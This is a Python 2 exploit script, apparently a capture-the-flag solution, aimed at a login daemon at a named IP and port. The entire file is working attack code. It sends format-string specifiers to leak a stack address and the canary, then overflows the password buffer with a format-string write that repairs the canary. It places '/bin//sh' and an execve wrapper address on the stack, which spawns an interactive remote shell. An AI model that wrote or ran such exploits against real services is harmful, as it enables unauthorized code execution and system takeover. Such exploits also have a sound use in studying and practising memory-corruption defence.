__author__ = 'HuyNA'


# Exploit the daemon at 23.23.190.205:10109

import sys
import os
import socket
import time
import struct
import telnetlib

def pi(v):
    return struct.pack('<I', v)

def recv_until(sock, delim):
    buf = ""
    try:
        while True:
            c = sock.recv(1)
            buf += c
            if delim in buf:
                break
    except:
        print '[-][recv_until]: timeout ... '
        pass
    return buf
def final_interact(s):
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

# Exploit 23.23.190.205:8976 to get the flag.
host = "23.23.190.205"
local_host="uakk73569427.anyuh89.koding.io"
port = 10109
s = socket.create_connection((local_host,port))
#s.settimeout(10)

login_success = "Successful login with "
invalid_pass = 'Invalid password for username: '
username = '%2$08x'+'%83$08x'
username = username.ljust(0x40-1-len(login_success)-len('t4l3sp1n'),'a')+'\n'
password1= 'huyna'+'\n'
password = 't4l3sp1n'
password = password.ljust(99,'b')+'\n'

print(recv_until(s, "Enter name: "))
s.send(username)
time.sleep(1)

print '[+] send password1 to leak stack canary ...'
data = recv_until(s, "Enter password: ")
print data
s.send(password1)

time.sleep(1)

print '[+] send password to overflow stack to setup stack...'
data = recv_until(s, "Enter password: ")
print data
username_address = data[len(invalid_pass):len(invalid_pass)+8]
print username_address
username_address = int(username_address,16)
password_address = username_address - 0x64
stack_canary = data[len(invalid_pass)+8:len(invalid_pass)+16]
stack_canary = int(stack_canary,16)
stack_canary1 = stack_canary+0xAA

print(  'username_buffer_address = {0}\n'
        'password_buffer_address = {1}\n'
        'stack_canary            = {2}\n'.format(hex(username_address),hex(password_address),hex(stack_canary)))

canary_address = username_address+0xc8-3
bin_sh_address = password_address+0x30+8
format_fix_canary = 'ffff'+pi(canary_address)+pi(bin_sh_address)+'%16x%75$n'+'%161x%76$n'
format_fix_canary = format_fix_canary.ljust(0x24,'g')
syscall_execve_address = 0x08049222     #     call    a_sys_execve_wrapper    ; 
password = 't4l3sp1n'+format_fix_canary+pi(stack_canary1)+'/bin//sh'+'c'*0x14+pi(syscall_execve_address)+pi(password_address+0x30)+pi(password_address+0x58)
syscall_parameter = pi(password_address+0x30)+'\x00'*4
password += syscall_parameter+'\n'

s.send(password)

time.sleep(1)
s.send('ls -l\n')
print s.recv(2014)

final_interact(s)

# DONE ...